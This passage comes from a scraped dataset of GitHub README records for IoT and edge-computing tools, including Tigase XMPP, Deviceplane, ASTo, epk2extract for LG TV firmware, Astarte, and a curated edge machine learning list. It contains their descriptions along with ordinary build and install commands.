to use iot framework to communicate and control iot devices over xmpp\ntigase iot framework - examples - examples on how to extend the tigase iot framework with support for different devices\ntigase rpi library - java low-level library to control sensors and devices connected to rasperrypi.\nfeatures\ntigase xmpp server contains full support for rfc 6120 - xmpp core, rfc 6121 - xmpp im and rfc 7395 - xmpp over websockets making it accessible using xmpp client connections:\nover tcp\nover http/https (bosh)\nover websockets\nand over server-to-server connections as well as over xmpp component connections.\nadditionally tigase xmpp server provides http api for integration with other services unable to communicate over xmpp.\nmoveover, tigase xmpp server comes with support for push notifications making it possible to push notification to mobile devices.\nfollowing features are supported by tigase xmpp server:\nxep-0016: flexible offline message retrieval\nxep-0030: service discovery\nxep-0045: multi user chat\nxep-0060: publish-subscribe\nxep-0079: advanced message processing\nxep-0114: jabber component protocol\nxep-0115: entity capabilities\nxep-0133: service administration\nxep-0136: message archiving\nxep-0163: personal eventing protocol\nxep-0198: stream management\nxep-0199: xmpp ping\nxep-0206: xmpp over bosh\nxep-0225: component connections\nxep-0237: roster versioning\nxep-0280: message carbons\nxep-0313: message archive management\nxep-0357: push notifications\nxep-0363: http file upload\nand many more...\nsupport\nwhen looking for support, please first search for answers to your question in the available online channels:\nour online documentation: tigase docs\nexisting issues in relevant project, for tigase server it's: tigase xmpp server github issues\nif you didn't find an answer in the resources above, feel free to submit your question as new issue on github or, if you have valid support subscription, open new support ticket.\ndownloads\nyou can download distribution version of the tigase xmpp server directly from here.\nif you wish to downloand snapshot build of the development version of tigase xmpp server you can grab it from here.\ninstallation and usage\ndocumentation of the project is part of the tigase xmpp server distribution package. quickstart guide is also available here.\ncompilation\ncompilation of the project is very easy as it is typical maven project. all you need to do is to execute\nmvn package test\nto compile the project and run unit tests.\nlicense\nofficial tigase repository is available at: https://github.com/tigase/tigase-server/.\ncopyright (c) 2004 tigase, inc.\nlicensed under agpl license version 3. other licensing options available upon request.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000332, "year": null}, {"Unnamed: 0": 338, "autor": 338, "date": null, "content": "\u26a0\ufe0f This repository has been deprecated. The new repositories can be found here: Agent | CLI | Controller.\nDeviceplane is an open source device management tool for embedded systems and edge computing. It solves various infrastructure problems related to remote device management such as:\nNetwork connectivity and SSH access\nOrchestration and deployment of remote updates\nHost and application monitoring\nDevice organization: naming, labeling, searching, and filtering of devices\nAccess and security controls\nDeviceplane integrates with your device by running a lightweight static binary via your system supervisor. It can be used with nearly any Linux distro, which means you can continue using Ubuntu, Raspbian, a Yocto build, or whatever else fits your needs.\nA hosted version of Deviceplane is available at https://cloud.deviceplane.com/.\nDocumentation\nVisit https://deviceplane.com/docs to view the full documentation.\nGetting Started\nThe architecture of Deviceplane is simple and designed to be easy to run and manage. The backend can be run with a single Docker command:\ndocker run -d --restart=unless-stopped -p 8080:8080 deviceplane/deviceplane\nFor more information on hosting Deviceplane yourself, check out the self-hosted docs.\nLocal Development\nSetup the database\nThis command will reset the database to an empty state and then seed it with some basic data.\nmake db-reset\nRun the controller\nThis command starts the controller running on port 8080 by default.\ngo run cmd/controller/main.go --allowed-origin \"http://localhost:3000\"\nRun the web application\nRun the following commands in the ui/ directory\nnpm install\nnpm start\nThe login is email@example.com / password.\nRun the agent\nNavigate to the /devices/register route in the web application. A command to run the agent locally will be generated and printed to the browser console.\nSupport\nFor bugs, issues, and feature requests please submit a GitHub issue.\nFor security issues, please email security@deviceplane.com instead of posting a public issue on GitHub.\nFor support, please email support@deviceplane.com.\nLicense\nCopyright (c) Deviceplane, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.", "link": "https://github.com/deviceplane/deviceplane", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "\u26a0\ufe0f this repository has been deprecated. the new repositories can be found here: agent | cli | controller.\ndeviceplane is an open source device management -----> tool !!!  for embedded systems and edge computing. it solves various infrastructure problems related to remote device management such as:\nnetwork connectivity and ssh access\norchestration and deployment of remote updates\nhost and application monitoring\ndevice organization: naming, labeling, searching, and filtering of devices\naccess and security controls\ndeviceplane integrates with your device by running a lightweight static binary via your system supervisor. it can be used with nearly any linux distro, which means you can continue using ubuntu, raspbian, a yocto build, or whatever else fits your needs.\na hosted version of deviceplane is available at https://cloud.deviceplane.com/.\ndocumentation\nvisit https://deviceplane.com/docs to view the full documentation.\ngetting started\nthe architecture of deviceplane is simple and designed to be easy to run and manage. the backend can be run with a single docker command:\ndocker run -d --restart=unless-stopped -p 8080:8080 deviceplane/deviceplane\nfor more information on hosting deviceplane yourself, check out the self-hosted docs.\nlocal development\nsetup the database\nthis command will reset the database to an empty state and then seed it with some basic data.\nmake db-reset\nrun the controller\nthis command starts the controller running on port 8080 by default.\ngo run cmd/controller/main.go --allowed-origin \"http://localhost:3000\"\nrun the web application\nrun the following commands in the ui/ directory\nnpm install\nnpm start\nthe login is email@example.com / password.\nrun the agent\nnavigate to the /devices/register route in the web application. a command to run the agent locally will be generated and printed to the browser console.\nsupport\nfor bugs, issues, and feature requests please submit a github issue.\nfor security issues, please email security@deviceplane.com instead of posting a public issue on github.\nfor support, please email support@deviceplane.com.\nlicense\ncopyright (c) deviceplane, inc.\nlicensed under the apache license, version 2.0 (the \"license\"); you may not use this file except in compliance with the license. you may obtain a copy of the license at\nhttp://www.apache.org/licenses/license-2.0\nunless required by applicable law or agreed to in writing, software distributed under the license is distributed on an \"as is\" basis, without warranties or conditions of any kind, either express or implied. see the license for the specific language governing permissions and limitations under the license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000338, "year": null}, {"Unnamed: 0": 344, "autor": 344, "date": null, "content": "ASTo - Apparatus Software Tool\nArchive Notice - After the completion of my research degree the repository has been archived.\nASTo has made a significant impact to my research. I want to express my gratitude to everyone that helped make it better.\nHowever, this is not the end. Active development with continue on CyberLens's repository. Please report issues and feature requests there.\nAn IoT network security analysis and visualization tool\nASTo is security analysis tool for IoT networks. It is developed to support the Apparatus security framework. ASTo is based on electron and cytoscape.js. The icons are provided by Google's Material Design.\nThe application is in alpha stage. The focus now is to improve the core functionality of the application along with the introduction of additional features, to reach beta stage.\nFeatures\nGraph-based visualization of IoT systems.\nModel IoT systems in design and implementation engineering phases.\nAn automatic model transition between the two engineering phases.\nModel IoT system state.\nAutomate implementation phase models generation using pcap-ng files.\nPerform model-based vulnerability identification through CVE databases.\nGenerate automated model-based security insights.\nAttribute-based pattern identification.\nSearch through graphs using a variety of options (concepts, modules, attributes).\nTogglable Light and Dark theme.\nSome screenshots\nConsole\nASTo has a command line console available on the bottom right corner of the app. You gain focus on the console by pressing the keybinding cmd + l for macOs and ctrl + l for Windows/Linux. If you type help, it will display a list of console options.\nThe console can be used to search for specific objects in the graph or perform operations. Raw text is used as search input. For example, if you type device, ASTo will highlight all the nodes in the graph that have the word device as an attribute.\nAll console commands must be preceded with a :. For example, typing :insights will perform the security insights functions. On the other hand, typing insights (without the :) will perform a search operation on the graph elements with the keyword insights.\nColor themes\nASTo supports a light and a dark color theme. The colors themes are based on Atom's One Dark and One Light. To switch between themes use the toggle button on the bottom left corner.\nTo Use\nTo clone and run this repository you'll need Git and Node.js installed on your computer. To download and install the app, type the following in your terminal:\n# Clone this repository\ngit clone https://github.com/Or3stis/apparatus.git\n# Navigate into the repository\ncd apparatus\n# Install dependencies\nnpm install\nDifferent mode operations of the app.\n# To run the app in the default mode\nnpm start\n# To run the app in developer mode\nnpm run dev\n# To build the app into binary\nnpm run dist\nBecause the app is still in prototype stage, it is best to keep up to date with the most recent commits. To do so, before starting the app, type:\n# inside the apparatus directory\n# update to the latest\ngit pull\nOnce the app starts, the first window (home screen) will ask you to choose which modeling phase would you like to use. After you select a phase, you will be presented with three choices. The first is to create a new graph. The second choice is to load an existing graph. The third option is the debug app, which loads a default graph used for debugging purposes.\nYou will find some example graphs in the sample folder.\n- Note in performance. If you render a graph with more than a thousand nodes, depending on your hardware, you might detect some performance issues. The reason is that the default label rendering of nodes and edges in ASTo is quite expensive. Rendering label on nodes and edges along with directional arrows is CPU expensive. To improve performance, you can hide the labels and the directional arrows by pressing the label button.\nYou can find more information about Cytoscape's performance optimizations in this link.\nPrivacy Notice\nThe Software does not collect personal information of any kind.\nThe only network operation the application performs is when the vulnerability identification process is used. The vulnerability identification makes a network request to 'https://cve.circl.lu/api/search/' (can be changed in the settings), which maintains its own analytics.\nContributing\nIf you want to contribute to the project, that's great \ud83d\ude03. Check the contributing guide. The application is being developed on macOs. That means that new commits might introduce breaking changes in other platforms. Especially commits that involve access to the file system. If something is not working, don't hesitate to create an issue.\nIf you want to find out how the app works check the wiki.\nYou can check the project's planned features in the roadmap.\nThanks\nA shoutout to @NOMNUDS and @nickarg who provide the much-needed feedback on Windows.\nLicense MIT", "link": "https://github.com/Or3stis/apparatus", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "asto - apparatus software -----> tool !!! \narchive notice - after the completion of my research degree the repository has been archived.\nasto has made a significant impact to my research. i want to express my gratitude to everyone that helped make it better.\nhowever, this is not the end. active development with continue on cyberlens's repository. please report issues and feature requests there.\nan iot network security analysis and visualization tool\nasto is security analysis tool for iot networks. it is developed to support the apparatus security framework. asto is based on electron and cytoscape.js. the icons are provided by google's material design.\nthe application is in alpha stage. the focus now is to improve the core functionality of the application along with the introduction of additional features, to reach beta stage.\nfeatures\ngraph-based visualization of iot systems.\nmodel iot systems in design and implementation engineering phases.\nan automatic model transition between the two engineering phases.\nmodel iot system state.\nautomate implementation phase models generation using pcap-ng files.\nperform model-based vulnerability identification through cve databases.\ngenerate automated model-based security insights.\nattribute-based pattern identification.\nsearch through graphs using a variety of options (concepts, modules, attributes).\ntogglable light and dark theme.\nsome screenshots\nconsole\nasto has a command line console available on the bottom right corner of the app. you gain focus on the console by pressing the keybinding cmd + l for macos and ctrl + l for windows/linux. if you type help, it will display a list of console options.\nthe console can be used to search for specific objects in the graph or perform operations. raw text is used as search input. for example, if you type device, asto will highlight all the nodes in the graph that have the word device as an attribute.\nall console commands must be preceded with a :. for example, typing :insights will perform the security insights functions. on the other hand, typing insights (without the :) will perform a search operation on the graph elements with the keyword insights.\ncolor themes\nasto supports a light and a dark color theme. the colors themes are based on atom's one dark and one light. to switch between themes use the toggle button on the bottom left corner.\nto use\nto clone and run this repository you'll need git and node.js installed on your computer. to download and install the app, type the following in your terminal:\n# clone this repository\ngit clone https://github.com/or3stis/apparatus.git\n# navigate into the repository\ncd apparatus\n# install dependencies\nnpm install\ndifferent mode operations of the app.\n# to run the app in the default mode\nnpm start\n# to run the app in developer mode\nnpm run dev\n# to build the app into binary\nnpm run dist\nbecause the app is still in prototype stage, it is best to keep up to date with the most recent commits. to do so, before starting the app, type:\n# inside the apparatus directory\n# update to the latest\ngit pull\nonce the app starts, the first window (home screen) will ask you to choose which modeling phase would you like to use. after you select a phase, you will be presented with three choices. the first is to create a new graph. the second choice is to load an existing graph. the third option is the debug app, which loads a default graph used for debugging purposes.\nyou will find some example graphs in the sample folder.\n- note in performance. if you render a graph with more than a thousand nodes, depending on your hardware, you might detect some performance issues. the reason is that the default label rendering of nodes and edges in asto is quite expensive. rendering label on nodes and edges along with directional arrows is cpu expensive. to improve performance, you can hide the labels and the directional arrows by pressing the label button.\nyou can find more information about cytoscape's performance optimizations in this link.\nprivacy notice\nthe software does not collect personal information of any kind.\nthe only network operation the application performs is when the vulnerability identification process is used. the vulnerability identification makes a network request to 'https://cve.circl.lu/api/search/' (can be changed in the settings), which maintains its own analytics.\ncontributing\nif you want to contribute to the project, that's great \ud83d\ude03. check the contributing guide. the application is being developed on macos. that means that new commits might introduce breaking changes in other platforms. especially commits that involve access to the file system. if something is not working, don't hesitate to create an issue.\nif you want to find out how the app works check the wiki.\nyou can check the project's planned features in the roadmap.\nthanks\na shoutout to @nomnuds and @nickarg who provide the much-needed feedback on windows.\nlicense mit", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000344, "year": null}, {"Unnamed: 0": 347, "autor": 347, "date": null, "content": "epk2extract\nJoin on Discord: https://discord.gg/xWqRVEm\nepk2extract is a tool that can extract, decrypt, convert multiple file formats that can be found in LG TV sets and similar devices.\nSupported Formats:\nNOTE: To unpack epk v2 and v3 you need proper AES and RSA keys for decryption. To get them you will need to dump them from a running TV.\nNOTE: To decrypt PVR recordings you need a dump of the unique AES-128 key from your TV\nFormat Notes\nepk v1 First version of epk format, not encrypted and not signed\nepk v2 Introduces signing and encryption, keys needed\nepk v3 Introduced with WebOS. Keys needed\nMediatek pkg UPG/PKG files used by Hisense/Sharp/Philips (missing Philips AES key) and possibly others\nPhilips \"fusion\" Upgrade files used by some Philips TVs\nsquashfs\ncramfs\nlz4 Slightly modified version with header magic\nlzo\ngzip\njffs2\nlzhs Special compression for MTK bootloaders (boot.pak, tzfw.pak), uses lzss + huffman\nlzhs_fs LZHS compressed filesystem used in MTK Upgrade files for the external writable partition (3rdw)\nmtdinfo/partinfo LG Partition table format (mtdi.pak, part.pak)\nstr/pif PVR recording format that can be found in netcast models\nsym LG Debugging symbols. Can extract function names and addresses to an IDA script file (idc)\nAlthough epk2extract is only tested on LG firmware files, you may use it to extract other files like a general unpack tool, as long as they are supported according to the table above.\n!!WARNING!!\nepk2extract isn't designed to repack files\nIf you wish to repack modified files, follow the openlgtv wiki/forum, and do it in a Linux environment (no cygwin)\nDon't repack files extracted in cygwin environment\nIn any case, you do so at your own risk\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE\nTools: Description\nlzhsenc Compresses a given file with lzhs algorithm\nlzhs_scanner Scans a given file to find lzhs files, and extracts them\nidb_extract Extracts Image Database (IDB) files that can be found in LG firmwares\njffs2extract Extracts JFFS2 images. Supports various compression algorithms\nTo compile on Linux:\nInstall build dependencies:\nUbuntu/Debian:\napt-get install git build-essential cmake liblzo2-dev libssl-dev libc6-dev\nMandriva/Mageia:\nurpmi git task-c++-devel cmake liblzo-devel libopenssl-devel glibc-devel --auto\nBuild it\n./build.sh\nAfter building, epk2extract can be found in ./build_<platform>/\nTo compile on Cygwin:\nInstall Cygwin and during setup select following packages:\nDevel -> gcc-g++, git, cmake, make\nLibs -> liblzo2-devel, zlib-devel\nNet -> openssl-devel\nUtils -> ncurses\nBuild it\n./build.sh\nThe build script automatically copies required shared libraries to the ./build_cygwin/ folder, so you can use epk2extract standalone/portable without a full cygwin installation.\n=====================\nHow to speed up extraction process\nYou can build the test build, which contains compiler optimizations, with this command\nCMAKE_FLAGS=-DCMAKE_BUILD_TYPE=Test ./build.sh\nThe Test build is orders of magnitude faster than the Debug build\nTo use:\nPut *.pem and AES.key files in the same directory as the epk2extract binary.\nRun it via sudo/fakeroot to avoid warnings (while extracting device nodes from rootfs):\nfakeroot ./epk2extract file\nTo get IDC from SYM run:\n./epk2extract xxxxxxxx.sym\nTo decode part.pak or mtdi.pak do:\n./epk2extract part.pak\nOr use partinfo.py (deprected)\npython partinfo.py part.pak", "link": "https://github.com/openlgtv/epk2extract", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "epk2extract\njoin on discord: https://discord.gg/xwqrvem\nepk2extract is a -----> tool !!!  that can extract, decrypt, convert multiple file formats that can be found in lg tv sets and similar devices.\nsupported formats:\nnote: to unpack epk v2 and v3 you need proper aes and rsa keys for decryption. to get them you will need to dump them from a running tv.\nnote: to decrypt pvr recordings you need a dump of the unique aes-128 key from your tv\nformat notes\nepk v1 first version of epk format, not encrypted and not signed\nepk v2 introduces signing and encryption, keys needed\nepk v3 introduced with webos. keys needed\nmediatek pkg upg/pkg files used by hisense/sharp/philips (missing philips aes key) and possibly others\nphilips \"fusion\" upgrade files used by some philips tvs\nsquashfs\ncramfs\nlz4 slightly modified version with header magic\nlzo\ngzip\njffs2\nlzhs special compression for mtk bootloaders (boot.pak, tzfw.pak), uses lzss + huffman\nlzhs_fs lzhs compressed filesystem used in mtk upgrade files for the external writable partition (3rdw)\nmtdinfo/partinfo lg partition table format (mtdi.pak, part.pak)\nstr/pif pvr recording format that can be found in netcast models\nsym lg debugging symbols. can extract function names and addresses to an ida script file (idc)\nalthough epk2extract is only tested on lg firmware files, you may use it to extract other files like a general unpack tool, as long as they are supported according to the table above.\n!!warning!!\nepk2extract isn't designed to repack files\nif you wish to repack modified files, follow the openlgtv wiki/forum, and do it in a linux environment (no cygwin)\ndon't repack files extracted in cygwin environment\nin any case, you do so at your own risk\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software\ntools: description\nlzhsenc compresses a given file with lzhs algorithm\nlzhs_scanner scans a given file to find lzhs files, and extracts them\nidb_extract extracts image database (idb) files that can be found in lg firmwares\njffs2extract extracts jffs2 images. supports various compression algorithms\nto compile on linux:\ninstall build dependencies:\nubuntu/debian:\napt-get install git build-essential cmake liblzo2-dev libssl-dev libc6-dev\nmandriva/mageia:\nurpmi git task-c++-devel cmake liblzo-devel libopenssl-devel glibc-devel --auto\nbuild it\n./build.sh\nafter building, epk2extract can be found in ./build_<platform>/\nto compile on cygwin:\ninstall cygwin and during setup select following packages:\ndevel -> gcc-g++, git, cmake, make\nlibs -> liblzo2-devel, zlib-devel\nnet -> openssl-devel\nutils -> ncurses\nbuild it\n./build.sh\nthe build script automatically copies required shared libraries to the ./build_cygwin/ folder, so you can use epk2extract standalone/portable without a full cygwin installation.\n=====================\nhow to speed up extraction process\nyou can build the test build, which contains compiler optimizations, with this command\ncmake_flags=-dcmake_build_type=test ./build.sh\nthe test build is orders of magnitude faster than the debug build\nto use:\nput *.pem and aes.key files in the same directory as the epk2extract binary.\nrun it via sudo/fakeroot to avoid warnings (while extracting device nodes from rootfs):\nfakeroot ./epk2extract file\nto get idc from sym run:\n./epk2extract xxxxxxxx.sym\nto decode part.pak or mtdi.pak do:\n./epk2extract part.pak\nor use partinfo.py (deprected)\npython partinfo.py part.pak", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000347, "year": null}, {"Unnamed: 0": 384, "autor": 384, "date": null, "content": "Astarte\nAstarte is an Open Source IoT platform focused on Data management and processing written in Elixir. It is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications and process data as it flows through a set of built-in features.\nIt performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern IoT platform.\nAstarte builds on top of amazing Open Source projects such as RabbitMQ and Cassandra/ScyllaDB.\nResources and Quickstart\nAstarte Documentation - The main resource to learn about Astarte.\nastartectl - A Command Line tool to manage your Astarte cluster(s).\nAstarte Kubernetes Operator - The preferred and supported way to run Astarte - in Production, and pretty much anywhere else.\nDevice SDKs - Connect your device to Astarte in a few lines of code. Available for Python, Qt5, ESP32, Elixir and counting.\nLet's try it!\nThis is the master branch, which is not guaranteed to always be in a usable state.\nFor production purposes we recommend using the latest stable release (currently v1.0.0), this branch should be used only for 1.1 development activities.\nCan't be easier. Pick your favorite machine with at least 4GB of free RAM, make sure it has Docker, and simply:\n$ git clone https://github.com/astarte-platform/astarte.git && cd astarte\n$ docker run -v $(pwd)/compose:/compose astarte/docker-compose-initializer:snapshot\n$ docker-compose up -d\nMake sure to use the latest stable release if you want a flawless experience.\nYou should be up and running in a matter of minutes. If you want a more thorough explanation and find out how to access your new Astarte cluster and what you can do with it, follow our \"Astarte in 5 minutes\" tutorial to get some fake or real devices to stream and process data while your tea gets ready.\nSweet! Let's move it to production!\nWhoa, not so fast. Putting together an Astarte instance which can handle your data might be tricky, and requires some knowledge about the platform to make sure it won't break.\nSo, if you're serious about getting Astarte in your production environment, you might want to learn more about it first. Start by having a look at its architecture and finding out how it works. Once you feel confident, head over to the Administration Manual.\nWhere do I find binaries?\nAstarte is designed from the ground up to be run in containers, with Kubernetes as a first-class citizen when it comes to deployment. Astarte's images can be found at Docker Hub, with every Astarte service coming with its own image.\nWith the help of our Kubernetes Operator and astartectl, you can deploy your Astarte instance to your favorite cloud provider in a matter of minutes.\nLooks great! I want to contribute!\nThat's awesome! Astarte is quite young as an Open Source project, so we're still setting up bits and pieces to make contributions easier and more effective, such as a shared roadmap, a proper contributor guide. For the time being, you can head over to the repository you want to contribute to and set up a Pull Request. We're using DCO for our contributions, so you'll need to sign off all commit messages before submitting a Pull Request.\nYou can also join us on #astarte slack channel on Elixir Slack and on #astarte IRC channel on freenode.\nWe accept all kind of quality contributions, as long as they adhere with the project goals and philosophy, and have some tests.\nAny chance I can get a hosted and managed instance?\nYup, stay tuned :) or get in touch with us.\nI need some help with my installation! Where can I get commercial support?\nGlad you asked. Astarte is developed by Ispirata, who fuels its development thanks to the generosity of many customers running it in production. Besides consultancy, installation, maintenance, long-term support and customizations, Ispirata also commercializes Astarte Enterprise, an Astarte variant packing in some additional goodies and features.\nGet in touch to find out how we can help you in getting Astarte in its best possible shape for your specific needs.\nLicense\nAstarte source code is released under the Apache 2 License.\nCheck the LICENSE file for more information.", "link": "https://github.com/astarte-platform/astarte", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "astarte\nastarte is an open source iot platform focused on data management and processing written in elixir. it is a turnkey solution which packs in everything you need for connecting a device fleet to a set of remote applications and process data as it flows through a set of built-in features.\nit performs data modeling, automated data reduction, real-time events, and provides you with any feature you might expect in a modern iot platform.\nastarte builds on top of amazing open source projects such as rabbitmq and cassandra/scylladb.\nresources and quickstart\nastarte documentation - the main resource to learn about astarte.\nastartectl - a command line -----> tool !!!  to manage your astarte cluster(s).\nastarte kubernetes operator - the preferred and supported way to run astarte - in production, and pretty much anywhere else.\ndevice sdks - connect your device to astarte in a few lines of code. available for python, qt5, esp32, elixir and counting.\nlet's try it!\nthis is the master branch, which is not guaranteed to always be in a usable state.\nfor production purposes we recommend using the latest stable release (currently v1.0.0), this branch should be used only for 1.1 development activities.\ncan't be easier. pick your favorite machine with at least 4gb of free ram, make sure it has docker, and simply:\n$ git clone https://github.com/astarte-platform/astarte.git && cd astarte\n$ docker run -v $(pwd)/compose:/compose astarte/docker-compose-initializer:snapshot\n$ docker-compose up -d\nmake sure to use the latest stable release if you want a flawless experience.\nyou should be up and running in a matter of minutes. if you want a more thorough explanation and find out how to access your new astarte cluster and what you can do with it, follow our \"astarte in 5 minutes\" tutorial to get some fake or real devices to stream and process data while your tea gets ready.\nsweet! let's move it to production!\nwhoa, not so fast. putting together an astarte instance which can handle your data might be tricky, and requires some knowledge about the platform to make sure it won't break.\nso, if you're serious about getting astarte in your production environment, you might want to learn more about it first. start by having a look at its architecture and finding out how it works. once you feel confident, head over to the administration manual.\nwhere do i find binaries?\nastarte is designed from the ground up to be run in containers, with kubernetes as a first-class citizen when it comes to deployment. astarte's images can be found at docker hub, with every astarte service coming with its own image.\nwith the help of our kubernetes operator and astartectl, you can deploy your astarte instance to your favorite cloud provider in a matter of minutes.\nlooks great! i want to contribute!\nthat's awesome! astarte is quite young as an open source project, so we're still setting up bits and pieces to make contributions easier and more effective, such as a shared roadmap, a proper contributor guide. for the time being, you can head over to the repository you want to contribute to and set up a pull request. we're using dco for our contributions, so you'll need to sign off all commit messages before submitting a pull request.\nyou can also join us on #astarte slack channel on elixir slack and on #astarte irc channel on freenode.\nwe accept all kind of quality contributions, as long as they adhere with the project goals and philosophy, and have some tests.\nany chance i can get a hosted and managed instance?\nyup, stay tuned :) or get in touch with us.\ni need some help with my installation! where can i get commercial support?\nglad you asked. astarte is developed by ispirata, who fuels its development thanks to the generosity of many customers running it in production. besides consultancy, installation, maintenance, long-term support and customizations, ispirata also commercializes astarte enterprise, an astarte variant packing in some additional goodies and features.\nget in touch to find out how we can help you in getting astarte in its best possible shape for your specific needs.\nlicense\nastarte source code is released under the apache 2 license.\ncheck the license file for more information.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000384, "year": null}, {"Unnamed: 0": 410, "autor": 410, "date": null, "content": "Awesome Edge Machine Learning\nA curated list of awesome edge machine learning resources, including research papers, inference engines, challenges, books, meetups and others.\nTable of Contents\nPapers\nApplications\nAutoML\nEfficient Architectures\nFederated Learning\nML Algorithms For Edge\nNetwork Pruning\nOthers\nQuantization\nDatasets\nInference Engines\nMCU and MPU Software Packages\nAI Chips\nBooks\nChallenges\nOther Resources\nContribute\nLicense\nPapers\nApplications\nThere is a countless number of possible edge machine learning applications. Here, we collect papers that describe specific solutions.\nAutoML\nAutomated machine learning (AutoML) is the process of automating the end-to-end process of applying machine learning to real-world problems.Wikipedia AutoML is for example used to design new efficient neural architectures with a constraint on a computational budget (defined either as a number of FLOPS or as an inference time measured on real device) or a size of the architecture.\nEfficient Architectures\nEfficient architectures represent neural networks with small memory footprint and fast inference time when measured on edge devices.\nFederated Learning\nFederated Learning enables mobile phones to collaboratively learn a shared prediction model while keeping all the training data on device, decoupling the ability to do machine learning from the need to store the data in the cloud.Google AI blog: Federated Learning\nML Algorithms For Edge\nStandard machine learning algorithms are not always able to run on edge devices due to large computational requirements and space complexity. This section introduces optimized machine learning algorithms.\nNetwork Pruning\nPruning is a common method to derive a compact network \u2013 after training, some structural portion of the parameters is removed, along with its associated computations.Importance Estimation for Neural Network Pruning\nOthers\nThis section contains papers that are related to edge machine learning but are not part of any major group. These papers often deal with deployment issues (i.e. optimizing inference on target platform).\nQuantization\nQuantization is the process of reducing a precision (from 32 bit floating point into lower bit depth representations) of weights and/or activations in a neural network. The advantages of this method are reduced model size and faster model inference on hardware that support arithmetic operations in lower precision.\nDatasets\nVisual Wake Words Dataset\nVisual Wake Words represents a common microcontroller vision use-case of identifying whether a person is present in the image or not, and provides a realistic benchmark for tiny vision models. Within a limited memory footprint of 250 KB, several state-of-the-art mobile models achieve accuracy of 85-90% on the Visual Wake Words dataset.\nInference Engines\nList of machine learning inference engines and APIs that are optimized for execution and/or training on edge devices.\nArm Compute Library\nSource code: https://github.com/ARM-software/ComputeLibrary\nArm\nBender\nSource code: https://github.com/xmartlabs/Bender\nDocumentation: https://xmartlabs.github.io/Bender/\nXmartlabs\nCaffe 2\nSource code: https://github.com/pytorch/pytorch/tree/master/caffe2\nDocumentation: https://caffe2.ai/\nFacebook\nCoreML\nDocumentation: https://developer.apple.com/documentation/coreml\nApple\nDeeplearning4j\nDocumentation: https://deeplearning4j.org/docs/latest/deeplearning4j-android\nSkymind\nEmbedded Learning Library\nSource code: https://github.com/Microsoft/ELL\nDocumentation: https://microsoft.github.io/ELL\nMicrosoft\nFeather CNN\nSource code: https://github.com/Tencent/FeatherCNN\nTencent\nMACE\nSource code: https://github.com/XiaoMi/mace\nDocumentation: https://mace.readthedocs.io/\nXiaoMi\nMNN\nSource code: https://github.com/alibaba/MNN\nAlibaba\nMXNet\nDocumentation: https://mxnet.incubator.apache.org/versions/master/faq/smart_device.html\nAmazon\nNCNN\nSource code: https://github.com/tencent/ncnn\nTencent\nNeural Networks API\nDocumentation: https://developer.android.com/ndk/guides/neuralnetworks/\nGoogle\nPaddle Mobile\nSource code: https://github.com/PaddlePaddle/paddle-mobile\nBaidu\nQualcomm Neural Processing SDK for AI\nSource code: https://developer.qualcomm.com/software/qualcomm-neural-processing-sdk\nQualcomm\nTengine\nSource code: https://github.com/OAID/Tengine\nOAID\nTensorFlow Lite\nSource code: https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite\nDocumentation: https://www.tensorflow.org/lite/\nGoogle\ndabnn\nSource code: https://github.com/JDAI-CV/dabnn\nJDAI Computer Vision\nMCU and MPU Software Packages\nList of software packages for AI development on MCU and MPU\nFP-AI-Sensing\nSTM32Cube function pack for ultra-low power IoT node with artificial intelligence (AI) application based on audio and motion sensing\nFP-AI-VISION1\nFP-AI-VISION1 is an STM32Cube function pack featuring examples of computer vision applications based on Convolutional Neural Network (CNN)\nProcessor SDK Linux for AM57x\nTIDL software framework leverages a highly optimized neural network implementation on TI\u2019s Sitara AM57x processors, making use of hardware acceleration on the device\nX-LINUX-AI-CV\nX-LINUX-AI-CV is an STM32 MPU OpenSTLinux Expansion Package that targets Artificial Intelligence for computer vision applications based on Convolutional Neural Network (CNN)\ne-AI Checker\nBased on the output result from the translator, the ROM/RAM mounting size and the inference execution processing time are calculated while referring to the information of the selected MCU/MPU\ne-AI Translator\nTool for converting Caffe and TensorFlow models to MCU/MPU development environment\neIQ Auto deep learning (DL) toolkit\nThe NXP eIQ\u2122 Auto deep learning (DL) toolkit enables developers to introduce DL algorithms into their applications and to continue satisfying automotive standards\neIQ ML Software Development Environment\nThe NXP\u00ae eIQ\u2122 machine learning software development environment enables the use of ML algorithms on 